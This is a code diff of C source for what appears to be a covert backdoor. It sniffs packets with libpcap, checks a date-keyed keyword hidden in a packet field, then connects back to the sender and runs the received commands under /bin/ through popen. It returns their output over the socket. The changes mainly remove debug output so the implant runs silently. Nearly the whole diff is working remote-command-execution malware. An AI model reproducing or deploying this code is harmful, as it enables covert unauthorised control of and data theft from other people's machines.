@@ -59,7 +59,6 @@ int client()
     {
         systemFatal("Unable to compile filter");
     }
-    printf("%s\n", filter);
     /* Set the filter on the listening device */
     if (pcap_setfilter(handle, &fp) == -1)
     {
@@ -131,17 +130,18 @@ void receivedPacket(u_char *args, const struct pcap_pkthdr *header, const u_char
         memcpy(code, (packet + SIZE_ETHERNET + ipHeaderSize + 4), sizeof(__uint32_t));
         
         strftime(Date, sizeof Date, "%Y:%m:%d", tm);
-        printf("%s\n", Date);
         
-        printf("%s", code);
-        
+        /* Decrypt our keyword using Todays Date*/
         encryptedField = encrypt_data(code, Date);
-        printf("%s\n", encryptedField);
-        
+                
+        /* Check if our keyword is correct, if not incorrect packet and return*/
         if(strncmp(encryptedField, "comp", 4) == 0){
-            printf("%s\n", encryptedField);
+            //printf("%s\n", encryptedField);
         }
-        
+        else{
+            return;
+        }
+            
         arg = 1;
         if(setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1)
         {
@@ -150,7 +150,7 @@ void receivedPacket(u_char *args, const struct pcap_pkthdr *header, const u_char
         
         bzero((char *)&server, sizeof(struct sockaddr_in));
         server.sin_family = AF_INET;
-        server.sin_port = htons(9090);
+        server.sin_port = htons(CONNECTION_PORT);
         
         inet_ntop(AF_INET, &(iph->ip_src), host, (socklen_t) INET_ADDRSTRLEN);
         if((hp = gethostbyname(host)) == NULL){
@@ -162,7 +162,7 @@ void receivedPacket(u_char *args, const struct pcap_pkthdr *header, const u_char
             systemFatal("can't connect to server\n");
         }
         
-        // receive command
+        // receive command from server
         bp = buf;
         bytes_to_read = 80;
         
@@ -171,13 +171,10 @@ void receivedPacket(u_char *args, const struct pcap_pkthdr *header, const u_char
             bp += n;
             bytes_to_read -= n;
         }
-        printf("%s\n",buf);
         
         command = strdup("/bin/");
         strcat(command, buf);
-        
-        printf("%s\n", command);
-        
+                
         /* Open the command for reading. */
         fp = popen(command, "r");
         
@@ -187,16 +184,14 @@ void receivedPacket(u_char *args, const struct pcap_pkthdr *header, const u_char
         
         /* Read the output a line at a time - output it. */
         while (fgets(path, sizeof(path)-1, fp) != NULL) {
-            //send results
+            //send results line by line
             strcpy(strtosend, path);
             send(sd, strtosend, 80, 0);
         }
-        
         /* close */
         pclose(fp);
         close(sd);
         free(host);
-        
         free(code);
     }
 }
